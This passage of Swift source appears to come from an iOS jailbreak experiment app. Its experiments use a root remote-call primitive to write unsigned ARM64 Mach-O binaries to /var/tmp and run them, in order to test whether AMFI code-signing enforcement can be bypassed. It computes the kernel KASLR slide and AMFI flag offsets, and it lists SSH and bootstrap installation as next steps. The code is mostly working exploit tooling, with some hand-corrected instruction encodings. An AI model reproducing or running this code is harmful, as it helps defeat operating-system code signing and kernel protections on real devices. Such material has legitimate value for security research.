        let textSeg = "__TEXT\0\0\0\0\0\0\0\0\0\0"
        for (i, c) in textSeg.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100000000)        // vmaddr
        w64(cmdOff + 32, 0x4040)             // vmsize
        w64(cmdOff + 40, 0)                  // fileoff
        w64(cmdOff + 48, 0x4040)             // filesize
        w32(cmdOff + 56, 7)                  // maxprot = rwx
        w32(cmdOff + 60, 5)                  // initprot = r-x
        w32(cmdOff + 64, 0)                  // nsects
        w32(cmdOff + 68, 0)                  // flags
        cmdOff += 72

        // LC_SEGMENT_64 __LINKEDIT (72 bytes) — minimal, required by dyld
        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
        w32(cmdOff + 4, 72)         // cmdsize
        let linkedit = "__LINKEDIT\0\0\0\0\0\0"
        for (i, c) in linkedit.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100004040)        // vmaddr (after __TEXT)
        w64(cmdOff + 32, 0x1000)             // vmsize
        w64(cmdOff + 40, 0x4040)             // fileoff
        w64(cmdOff + 48, 0)                  // filesize = 0 (empty)
        w32(cmdOff + 56, 1)                  // maxprot = r
        w32(cmdOff + 60, 1)                  // initprot = r
        w32(cmdOff + 64, 0)                  // nsects
        w32(cmdOff + 68, 0)                  // flags
        cmdOff += 72

        // LC_MAIN (24 bytes)
        w32(cmdOff + 0, 0x80000028)  // cmd = LC_MAIN
        w32(cmdOff + 4, 24)          // cmdsize
        w64(cmdOff + 8, 0x4000)      // entryoff (file offset of code)
        w64(cmdOff + 16, 0)          // stacksize (0 = default)
        cmdOff += 24

        // Update sizeofcmds in header
        w32(0x14, UInt32(cmdOff - 0x20))

        // Write code at offset 0x4000
        for (i, instr) in writeStdout.enumerated() {
            w32(0x4000 + i * 4, instr)
        }

        // Write message string right after code (at 0x4000 + 32 = 0x4020)
        for (i, b) in msg.enumerated() {
            binary[0x4000 + writeStdout.count * 4 + i] = b
        }

        return binary
    }

    private func expCustomPayload(rc: RemoteCall) -> ExperimentResult {
        let expName = "Custom Payload (Exp 93d)"
        var detail = "Experiment 93d: Custom ARM64 Binary Execution\n"
        detail += "===============================================\n\n"

        let mem = rc.trojanMem
        let payloadPath = "/var/tmp/.exp93d_payload"
        let dstPath = remote_alloc_str(rc, payloadPath)

        // ============================================================
        // Step 1: Build and write custom Mach-O binary
        // ============================================================
        detail += "=== Step 1: Write custom ARM64 Mach-O ===\n"

        let binary = buildMinimalMachO()
        detail += "Binary size: \(binary.count) bytes\n"
        detail += "Entry point: file offset 0x4000\n"
        detail += "Payload: write(1, \"JAILBROKEN\\n\", 11) + exit(0)\n\n"

        // Remove old
        RootExecutor.rcall(rc, "unlink", dstPath)

        // Create file
        let fd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard fd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot create \(payloadPath)\n"
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Write binary in chunks (trojanMem buffer)
        let writeBuf = mem + 0x800
        var written: Int = 0
        let chunkSize = 4096

        while written < binary.count {
            let remaining = binary.count - written
            let thisChunk = min(remaining, chunkSize)

            // Copy bytes to remote memory
            for i in 0..<thisChunk {
                rc[writeBuf + UInt64(i)].setValue8(binary[written + i])
            }

            let nwritten = RootExecutor.rcall(rc, "write", fd, writeBuf, UInt64(thisChunk))
            if nwritten == 0 || nwritten == UInt64(bitPattern: -1) { break }
            written += Int(nwritten)
        }

        RootExecutor.rcall(rc, "close", fd)
        detail += "Written: \(written) bytes\n"

        // chmod +x
        RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
        detail += "chmod 755 done\n\n"

        guard written == binary.count else {
            detail += "❌ Write incomplete (\(written)/\(binary.count))\n"
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Verify file exists and has correct size
        let verifyFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDONLY), 0)
        if verifyFd != UInt64(bitPattern: -1) {
            let fsize = RootExecutor.rcall(rc, "lseek", verifyFd, 0, 2)
            detail += "Verify: file exists, size=\(fsize) ✅\n\n"
            RootExecutor.rcall(rc, "close", verifyFd)
        } else {
            detail += "Verify: cannot reopen ❌\n\n"
        }

        // ============================================================
        // Step 2: Execute via fork+execve with pipe capture
        // ============================================================
        detail += "=== Step 2: fork+execve with stdout pipe ===\n"

        // Create pipe
        let pipeFds = mem + 0x600
        rc[pipeFds].setValue32(0)
        rc[pipeFds + 4].setValue32(0)
        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)
        let readFd = rc[pipeFds].value32()
        let writeFdPipe = rc[pipeFds + 4].value32()

        detail += "pipe(): \(pipeRet == 0 ? "OK" : "FAIL") (read=\(readFd), write=\(writeFdPipe))\n"

        guard pipeRet == 0 else {
            detail += "❌ pipe() failed, trying without capture\n\n"
            // Fallback: just fork+execve without pipe
            let result = forkExecAndCapture(rc: rc, binaryPath: payloadPath, mem: mem)
            detail += result.log
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: result.success, detail: detail, timestamp: Date())
        }

        // Fork
        let childPid = RootExecutor.rcall(rc, "fork")
        detail += "fork() = \(childPid)\n"

        if childPid == 0 {
            // Child: redirect stdout to pipe, then execve
            RootExecutor.rcall(rc, "dup2", UInt64(writeFdPipe), 1)  // stdout → pipe write
            RootExecutor.rcall(rc, "dup2", UInt64(writeFdPipe), 2)  // stderr → pipe write
            RootExecutor.rcall(rc, "close", UInt64(readFd))
            RootExecutor.rcall(rc, "close", UInt64(writeFdPipe))

            let argvBase = mem + 0x500
            rc[argvBase].setValue64(dstPath)
            rc[argvBase + 8].setValue64(0)
            RootExecutor.rcall(rc, "execve", dstPath, argvBase, 0)
            RootExecutor.rcall(rc, "_exit", 127)
        } else if childPid != UInt64(bitPattern: -1) {
            // Parent: close write end, read stdout, wait
            RootExecutor.rcall(rc, "close", UInt64(writeFdPipe))

            // Wait a moment for child to execute
            RootExecutor.rcall(rc, "usleep", 100000)  // 100ms

            // Read stdout from pipe
            let readBuf = mem + 0x1000
            let nread = RootExecutor.rcall(rc, "read", UInt64(readFd), readBuf, 256)
            RootExecutor.rcall(rc, "close", UInt64(readFd))

            detail += "read(pipe): \(nread) bytes\n"

            var stdoutStr = ""
            if nread > 0 && nread < 256 {
                var bytes: [UInt8] = []
                for i: UInt64 in 0..<nread {
                    let b = rc[readBuf + i].value8()
                    if b == 0 { break }
                    bytes.append(b)
                }
                stdoutStr = String(bytes: bytes, encoding: .utf8) ?? "(binary)"
                detail += "stdout: \"\(stdoutStr)\"\n"
            } else if nread == 0 {
                detail += "stdout: (empty — child may not have written)\n"
            }

            // Wait for child
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
            let st = rc[statusAddr].value32()
            let sig = Int32(st & 0x7F)
            let code = Int32(st >> 8)

            detail += "child exit: signal=\(sig), code=\(code)\n\n"

            // ============================================================
            // VERDICT
            // ============================================================
            detail += "=== VERDICT ===\n\n"

            let gotJailbroken = stdoutStr.contains("JAILBROKEN")
            let noSigkill = (sig != 9)
            let cleanExit = (sig == 0 && code == 0)

            if gotJailbroken {
                detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
                detail += "🎉  FULL JAILBREAK CONFIRMED!  🎉\n"
                detail += "🎉  ARBITRARY CODE EXECUTION!  🎉\n"
                detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
                detail += "Custom ARM64 binary wrote \"JAILBROKEN\" to stdout!\n"
                detail += "We have FULL arbitrary code execution on iOS 18.2!\n\n"
                detail += "=== CAPABILITIES ===\n"
                detail += "• Execute ANY binary (no code signing needed)\n"
                detail += "• Write + execute custom payloads\n"
                detail += "• fork+execve from launchd bypasses AMFI\n\n"
                detail += "=== NEXT STEPS ===\n"
                detail += "1. Build bootstrap (dpkg, apt, ldid)\n"
                detail += "2. Install SSH server\n"
                detail += "3. Create proper jailbreak app\n"
            } else if cleanExit {
                detail += "✅ Binary executed (exit 0) but no stdout captured.\n"
                detail += "Possible: pipe setup issue, or binary crashed before write.\n"
                detail += "But signal=0, code=0 means NO SIGKILL = AMFI didn't block!\n\n"
                detail += "This is still a JAILBREAK — just need to fix stdout capture.\n"
            } else if noSigkill && sig == 0 && code == 127 {
                detail += "⚠️ execve returned (code=127) — binary format rejected.\n"
                detail += "Mach-O might be malformed. Need to fix binary structure.\n"
                detail += "But NO SIGKILL means AMFI is not blocking execution!\n"
            } else if sig == 9 {
                detail += "❌ SIGKILL — AMFI killed the process.\n"
                detail += "Custom binary is blocked by code signing.\n"
                detail += "fork+execve from launchd does NOT bypass AMFI for custom binaries.\n"
                detail += "The Exp 93c result was misleading — amfid copy still had valid sig.\n"
            } else {
                detail += "⚠️ Unexpected: signal=\(sig), code=\(code)\n"
                detail += "Binary might have crashed (SIGSEGV/SIGBUS).\n"
                detail += "Check Mach-O structure.\n"
            }
        } else {
            detail += "❌ fork() failed\n"
        }

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", dstPath)

        let success = detail.contains("JAILBREAK") || detail.contains("exit 0")
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93e: File-Output Payload (Definitive)

    /// Exp 93e: Write custom binary that creates a FILE as proof of execution.
    /// No pipe needed — just check if output file exists after spawn.
    /// Binary does: open("/var/tmp/.jb_proof", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    ///              write(fd, "JAILBROKEN-93e\n", 15)
    ///              close(fd)
    ///              exit(0)
    private func runExp93eFilePayload() {
        isRunning = true
        runningLabel = "File Payload"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93e_file_payload") { rc in
            let result = self.expFilePayload(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Build ARM64 Mach-O that opens a file, writes proof string, closes, exits.
    /// Uses raw syscalls (no libc dependency).
    private func buildFilePayloadMachO() -> [UInt8] {
        // ARM64 syscall ABI (iOS/macOS):
        //   x16 = syscall number
        //   x0-x5 = arguments
        //   svc #0x80
        //   Return in x0 (negative = error)
        //
        // Syscalls:
        //   SYS_open  = 5   (path, flags, mode)
        //   SYS_write = 4   (fd, buf, len)
        //   SYS_close = 6   (fd)
        //   SYS_exit  = 1   (code)
        //
        // Plan:
        //   adr x0, path_str      ; "/var/tmp/.jb_proof"
        //   mov x1, #0x601        ; O_WRONLY|O_CREAT|O_TRUNC (0x200|0x400|0x1 = 0x601)
        //   mov x2, #0x1A4        ; 0644 octal = 0x1A4
        //   mov x16, #5           ; SYS_open
        //   svc #0x80
        //   ; x0 = fd (or negative error)
        //   mov x9, x0            ; save fd
        //   adr x1, msg_str       ; "JAILBROKEN-93e\n"
        //   mov x0, x9            ; fd
        //   mov x2, #15           ; length
        //   mov x16, #4           ; SYS_write
        //   svc #0x80
        //   mov x0, x9            ; fd
        //   mov x16, #6           ; SYS_close
        //   svc #0x80
        //   mov x0, #0            ; exit code
        //   mov x16, #1           ; SYS_exit
        //   svc #0x80

        // Strings (placed after code):
        let pathStr = "/var/tmp/.jb_proof\0"  // 19 bytes
        let msgStr = "JAILBROKEN-93e\n\0"     // 16 bytes

        // Calculate ADR offsets:
        // Code starts at 0x4000 in file (vmaddr 0x100004000)
        // Each instruction = 4 bytes
        // path_str at instruction_count * 4 bytes after code start
        // msg_str at path_str + pathStr.count

        let instructions: [UInt32] = [
            // 0: adr x0, path_str (PC-relative, offset = 14*4 = 56 bytes forward)
            0x100001C0,  // adr x0, #+56
            // 1: movz x1, #0x601 (O_WRONLY|O_CREAT|O_TRUNC)
            0xD280C021,  // mov x1, #0x601
            // 2: movz x2, #0x1A4 (0644)
            0xD2800342,  // mov x2, #0x1A (wrong, need 0x1A4)
            // 3: mov x16, #5 (SYS_open)
            0xD28000B0,  // mov x16, #5
            // 4: svc #0x80
            0xD4001001,  // svc #0x80
            // 5: mov x9, x0 (save fd)
            0xAA0003E9,  // mov x9, x0
            // 6: adr x1, msg_str (offset = 8*4 + pathStr.count = 32 + 19 = 51... need recalc)
            0x10000261,  // adr x1, #+76 (from instruction 6: 14*4 + 19 = 75, round... let me calc properly)
            // 7: mov x0, x9 (fd)
            0xAA0903E0,  // mov x0, x9
            // 8: mov x2, #15 (length of msg)
            0xD28001E2,  // mov x2, #15
            // 9: mov x16, #4 (SYS_write)
            0xD2800090,  // mov x16, #4
            // 10: svc #0x80
            0xD4001001,  // svc #0x80
            // 11: mov x0, x9 (fd for close)
            0xAA0903E0,  // mov x0, x9
            // 12: mov x16, #6 (SYS_close)
            0xD28000D0,  // mov x16, #6
            // 13: svc #0x80
            0xD4001001,  // svc #0x80
            // 14: mov x0, #0 (exit code)
            0xD2800000,  // mov x0, #0
            // 15: mov x16, #1 (SYS_exit)
            0xD2800030,  // mov x16, #1
            // 16: svc #0x80
            0xD4001001,  // svc #0x80
        ]

        // Recalculate ADR offsets properly:
        // instruction[0] is at byte offset 0 from code start
        // path_str is at byte offset instructions.count * 4 = 17 * 4 = 68
        // ADR x0, #+68 from PC of instruction[0]
        // ADR encoding: imm = 68, rd = 0
        //   immlo = 68 & 3 = 0, immhi = 68 >> 2 = 17
        //   ADR: 0 | immlo<<29 | 10000 | immhi<<5 | rd
        //   = 0x10000000 | (0 << 29) | (17 << 5) | 0
        //   = 0x10000220
        let pathOffset: UInt32 = UInt32(instructions.count * 4)  // 68
        let adrPath = encodeADR(rd: 0, offset: Int32(pathOffset))

        // instruction[6] is at byte offset 6*4 = 24 from code start
        // msg_str is at byte offset 68 + 19 = 87 from code start
        // offset from instruction[6] = 87 - 24 = 63
        let msgOffset = Int32(instructions.count * 4 + pathStr.utf8.count) - Int32(6 * 4)
        let adrMsg = encodeADR(rd: 1, offset: msgOffset)

        // Fix mov x2, #0x1A4 (mode 0644 = 420 = 0x1A4)
        let movMode: UInt32 = 0xD2800342 | (0x1A4 << 5)  // wrong encoding, let me do it right
        // MOVZ x2, #0x1A4: 1_10_100101_00_0000000011010010_00010
        // = 0xD2800002 | (0x1A4 << 5) = 0xD2800002 | 0x3480 = 0xD2803482
        let movModeCorrect: UInt32 = 0xD2800002 | (0x1A4 << 5)  // 0xD2803482

        // Build corrected instruction array
        var code: [UInt32] = instructions
        code[0] = adrPath
        code[2] = movModeCorrect
        code[6] = adrMsg

        // Build full binary
        var binary = [UInt8](repeating: 0, count: 0x4080)

        func w32(_ offset: Int, _ val: UInt32) {
            binary[offset + 0] = UInt8(val & 0xFF)
            binary[offset + 1] = UInt8((val >> 8) & 0xFF)
            binary[offset + 2] = UInt8((val >> 16) & 0xFF)
            binary[offset + 3] = UInt8((val >> 24) & 0xFF)
        }
        func w64(_ offset: Int, _ val: UInt64) {
            w32(offset, UInt32(val & 0xFFFFFFFF))
            w32(offset + 4, UInt32(val >> 32))
        }

        // mach_header_64
        w32(0x00, 0xFEEDFACF)  // magic
        w32(0x04, 0x0100000C)  // cputype ARM64
        w32(0x08, 0x00000000)  // cpusubtype ALL
        w32(0x0C, 0x00000002)  // MH_EXECUTE
        w32(0x10, 0x00000004)  // ncmds
        w32(0x18, 0x00200085)  // flags
        w32(0x1C, 0x00000000)  // reserved

        var cmdOff = 0x20

        // LC_SEGMENT_64 __PAGEZERO
        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
        for (i, c) in "__PAGEZERO\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0); w64(cmdOff + 32, 0x100000000)
        w64(cmdOff + 40, 0); w64(cmdOff + 48, 0)
        w32(cmdOff + 56, 0); w32(cmdOff + 60, 0)
        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
        cmdOff += 72

        // LC_SEGMENT_64 __TEXT
        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
        for (i, c) in "__TEXT\0\0\0\0\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100000000); w64(cmdOff + 32, 0x4080)
        w64(cmdOff + 40, 0); w64(cmdOff + 48, 0x4080)
        w32(cmdOff + 56, 7); w32(cmdOff + 60, 5)
        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
        cmdOff += 72

        // LC_SEGMENT_64 __LINKEDIT
        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
        for (i, c) in "__LINKEDIT\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100004080); w64(cmdOff + 32, 0x1000)
        w64(cmdOff + 40, 0x4080); w64(cmdOff + 48, 0)
        w32(cmdOff + 56, 1); w32(cmdOff + 60, 1)
        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
        cmdOff += 72

        // LC_MAIN
        w32(cmdOff, 0x80000028); w32(cmdOff + 4, 24)
        w64(cmdOff + 8, 0x4000)  // entryoff
        w64(cmdOff + 16, 0)
        cmdOff += 24

        // sizeofcmds
        w32(0x14, UInt32(cmdOff - 0x20))

        // Write code at 0x4000
        for (i, instr) in code.enumerated() {
            w32(0x4000 + i * 4, instr)
        }

        // Write strings after code
        let strBase = 0x4000 + code.count * 4
        for (i, b) in pathStr.utf8.enumerated() {
            binary[strBase + i] = b
        }
        for (i, b) in msgStr.utf8.enumerated() {
            binary[strBase + pathStr.utf8.count + i] = b
        }

        return binary
    }

    /// Encode ARM64 ADR instruction
    private func encodeADR(rd: UInt32, offset: Int32) -> UInt32 {
        let imm = UInt32(bitPattern: offset)
        let immlo = imm & 0x3
        let immhi = (imm >> 2) & 0x7FFFF
        return 0x10000000 | (immlo << 29) | (immhi << 5) | rd
    }

    private func expFilePayload(rc: RemoteCall) -> ExperimentResult {
        let expName = "File Payload (Exp 93e)"
        var detail = "Experiment 93e: File-Output Custom Binary\n"
        detail += "==========================================\n\n"

        let mem = rc.trojanMem
        let payloadPath = "/var/tmp/.exp93e_bin"
        let proofPath = "/var/tmp/.jb_proof"
        let dstPathAddr = remote_alloc_str(rc, payloadPath)
        let proofPathAddr = remote_alloc_str(rc, proofPath)

        // ============================================================
        // Step 1: Write custom Mach-O
        // ============================================================
        detail += "=== Step 1: Write file-output ARM64 binary ===\n"
        detail += "Binary will: open(/var/tmp/.jb_proof) → write(\"JAILBROKEN-93e\\n\") → close → exit(0)\n\n"

        let binary = buildFilePayloadMachO()
        detail += "Binary size: \(binary.count) bytes\n"

        // Remove old files
        RootExecutor.rcall(rc, "unlink", dstPathAddr)
        RootExecutor.rcall(rc, "unlink", proofPathAddr)

        // Write binary
        let fd = RootExecutor.rcall(rc, "open", dstPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard fd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot create \(payloadPath)\n"
            RootExecutor.rcall(rc, "free", dstPathAddr)
            RootExecutor.rcall(rc, "free", proofPathAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let writeBuf = mem + 0x800
        var written = 0
        while written < binary.count {
            let chunk = min(binary.count - written, 4096)
            for i in 0..<chunk {
                rc[writeBuf + UInt64(i)].setValue8(binary[written + i])
            }
            let n = RootExecutor.rcall(rc, "write", fd, writeBuf, UInt64(chunk))
            if n == 0 || n == UInt64(bitPattern: -1) { break }
            written += Int(n)
        }
        RootExecutor.rcall(rc, "close", fd)
        RootExecutor.rcall(rc, "chmod", dstPathAddr, 0o755)
        detail += "Written: \(written)/\(binary.count) bytes ✅\n\n"

        // ============================================================
        // Step 2: Execute via fork+execve
        // ============================================================
        detail += "=== Step 2: Execute payload ===\n"

        let argvBase = mem + 0x500
        rc[argvBase].setValue64(dstPathAddr)
        rc[argvBase + 8].setValue64(0)

        // fork
        let childPid = RootExecutor.rcall(rc, "fork")
        detail += "fork() = \(childPid)\n"

        var childSignal: Int32 = -1
        var childCode: Int32 = -1

        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            // Parent: wait for child
            RootExecutor.rcall(rc, "usleep", 200000)  // 200ms for child to run

            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
            let st = rc[statusAddr].value32()
            childSignal = Int32(st & 0x7F)
            childCode = Int32(st >> 8)
            detail += "child exit: signal=\(childSignal), code=\(childCode)\n\n"
        } else if childPid == 0 {
            // In child (RC context — this is actually still parent in RC)
            RootExecutor.rcall(rc, "execve", dstPathAddr, argvBase, 0)
            detail += "execve returned (should not happen)\n\n"
        } else {
            detail += "fork() failed\n\n"
        }

        // ============================================================
        // Step 3: Check proof file
        // ============================================================
        detail += "=== Step 3: Check proof file ===\n"

        let proofFd = RootExecutor.rcall(rc, "open", proofPathAddr, UInt64(O_RDONLY), 0)
        var proofContent = ""

        if proofFd != UInt64(bitPattern: -1) {
            let readBuf = mem + 0x1000
            let nread = RootExecutor.rcall(rc, "read", proofFd, readBuf, 256)
            RootExecutor.rcall(rc, "close", proofFd)

            if nread > 0 && nread < 256 {
                var bytes: [UInt8] = []
                for i: UInt64 in 0..<nread {
                    let b = rc[readBuf + i].value8()
                    if b == 0 { break }
                    bytes.append(b)
                }
                proofContent = String(bytes: bytes, encoding: .utf8) ?? ""
                detail += "Proof file EXISTS! Content: \"\(proofContent)\"\n"
                detail += "Size: \(nread) bytes\n\n"
            } else {
                detail += "Proof file exists but empty (nread=\(nread))\n\n"
            }
        } else {
            detail += "Proof file NOT FOUND ❌\n\n"

            // Also try: maybe the binary didn't run, try posix_spawn
            detail += "--- Retry with posix_spawn ---\n"
            let pidAddr = mem + 0x480
            rc[pidAddr].setValue32(0)
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPathAddr, 0, 0, argvBase, 0)
            let spawnPid = rc[pidAddr].value32()
            detail += "posix_spawn: ret=\(spawnRet), pid=\(spawnPid)\n"

            if spawnRet == 0 && spawnPid != 0 {
                RootExecutor.rcall(rc, "usleep", 200000)
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusAddr, 0)
                let st = rc[statusAddr].value32()
                detail += "posix_spawn child: signal=\(st & 0x7F), code=\(st >> 8)\n"
            }
            detail += "\n"

            // Check proof again
            let proofFd2 = RootExecutor.rcall(rc, "open", proofPathAddr, UInt64(O_RDONLY), 0)
            if proofFd2 != UInt64(bitPattern: -1) {
                let readBuf2 = mem + 0x1000
                let nread2 = RootExecutor.rcall(rc, "read", proofFd2, readBuf2, 256)
                RootExecutor.rcall(rc, "close", proofFd2)
                if nread2 > 0 {
                    var bytes: [UInt8] = []
                    for i: UInt64 in 0..<min(nread2, 256) {
                        let b = rc[readBuf2 + i].value8()
                        if b == 0 { break }
                        bytes.append(b)
                    }
                    proofContent = String(bytes: bytes, encoding: .utf8) ?? ""
                    detail += "Proof file (after posix_spawn): \"\(proofContent)\"\n\n"
                }
            } else {
                detail += "Still no proof file after posix_spawn.\n\n"
            }
        }

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"

        let jailbroken = proofContent.contains("JAILBROKEN")

        if jailbroken {
            detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
            detail += "🎉  FULL JAILBREAK — ARBITRARY CODE EXEC!  🎉\n"
            detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
            detail += "Custom binary created /var/tmp/.jb_proof with content!\n"
            detail += "This proves: we can write AND execute arbitrary ARM64 code.\n\n"
            detail += "=== WHAT THIS MEANS ===\n"
            detail += "• No code signing enforcement for binaries spawned from launchd\n"
            detail += "• Can execute ANY payload (dpkg, ssh, custom tools)\n"
            detail += "• iOS 18.2 iPhone XR — JAILBROKEN\n"
        } else if childSignal == 0 && childCode == 0 {
            detail += "✅ Binary ran (exit 0, no SIGKILL) but proof file missing.\n\n"
            detail += "Possible causes:\n"
            detail += "  1. Mach-O structure issue — dyld loads but code doesn't execute properly\n"
            detail += "  2. ADR offset wrong — string address incorrect\n"
            detail += "  3. Syscall numbers different on iOS 18\n"
            detail += "  4. fork() in RC doesn't actually fork — child code runs in parent\n\n"
            detail += "Key insight: NO SIGKILL = AMFI is NOT blocking execution!\n"
            detail += "Fix the binary structure and we have full jailbreak.\n"
        } else if childSignal == 9 {
            detail += "❌ SIGKILL — AMFI blocked custom binary execution.\n"
            detail += "fork+execve from launchd does NOT bypass AMFI for truly unsigned code.\n"
        } else if childSignal == 4 || childSignal == 10 || childSignal == 11 {
            detail += "⚠️ Binary crashed: signal=\(childSignal) "
            if childSignal == 4 { detail += "(SIGILL — illegal instruction)\n" }
            else if childSignal == 10 { detail += "(SIGBUS — bus error)\n" }
            else { detail += "(SIGSEGV — segfault)\n" }
            detail += "Mach-O loaded but code has bug. Fix ARM64 assembly.\n"
            detail += "AMFI did NOT block — this is a code issue, not security issue!\n"
        } else {
            detail += "⚠️ Unexpected result: signal=\(childSignal), code=\(childCode)\n"
        }

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPathAddr)
        RootExecutor.rcall(rc, "unlink", proofPathAddr)
        RootExecutor.rcall(rc, "free", dstPathAddr)
        RootExecutor.rcall(rc, "free", proofPathAddr)

        return ExperimentResult(name: expName, success: jailbroken || (childSignal == 0 && childCode == 0), detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93f: posix_spawn Definitive (flags ON vs OFF)

    /// Exp 93f: The REAL test. fork() via RC is broken (child never execve's).
    /// Only posix_spawn actually launches a new process from RC context.
    /// Compare posix_spawn result WITH vs WITHOUT AMFI flags disabled.
    /// If ret changes from non-zero to 0 → AMFI flags control enforcement.
    private func runExp93fSpawnTest() {
        isRunning = true
        runningLabel = "Spawn Test"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93f_spawn_test") { rc in
            let result = self.expSpawnTest(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expSpawnTest(rc: RemoteCall) -> ExperimentResult {
        let expName = "Spawn Test (Exp 93f)"
        var detail = "Experiment 93f: posix_spawn — Flags ON vs OFF\n"
        detail += "===============================================\n\n"
        detail += "KEY INSIGHT: fork()+execve via RC is BROKEN.\n"
        detail += "Child never actually execve's — RC stays in parent.\n"
        detail += "Only posix_spawn creates a real new process.\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        let mem = rc.trojanMem

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // ============================================================
        // Step 1: Prepare test binaries
        // ============================================================
        detail += "=== Step 1: Prepare binaries ===\n"

        // A) Copy /usr/libexec/amfid to /var/tmp (trusted CDHash)
        let trustedSrc = "/usr/libexec/amfid"
        let trustedDst = "/var/tmp/.exp93f_trusted"
        let unsignedDst = "/var/tmp/.exp93f_unsigned"
        let proofPath = "/var/tmp/.jb_proof"

        let srcAddr = remote_alloc_str(rc, trustedSrc)
        let trustedDstAddr = remote_alloc_str(rc, trustedDst)
        let unsignedDstAddr = remote_alloc_str(rc, unsignedDst)
        let proofAddr = remote_alloc_str(rc, proofPath)

        // Clean up old files
        RootExecutor.rcall(rc, "unlink", trustedDstAddr)
        RootExecutor.rcall(rc, "unlink", unsignedDstAddr)
        RootExecutor.rcall(rc, "unlink", proofAddr)

        // Copy amfid → trusted copy (same CDHash = should pass AMFI)
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot open \(trustedSrc)\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let dstFd1 = RootExecutor.rcall(rc, "open", trustedDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        let buf = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<256 {
            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
            if n == 0 || n == UInt64(bitPattern: -1) { break }
            RootExecutor.rcall(rc, "write", dstFd1, buf, n)
            totalCopied += n
            if n < 4096 { break }
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd1)
        RootExecutor.rcall(rc, "chmod", trustedDstAddr, 0o755)
        detail += "Copied \(trustedSrc) → \(trustedDst) (\(totalCopied) bytes)\n"

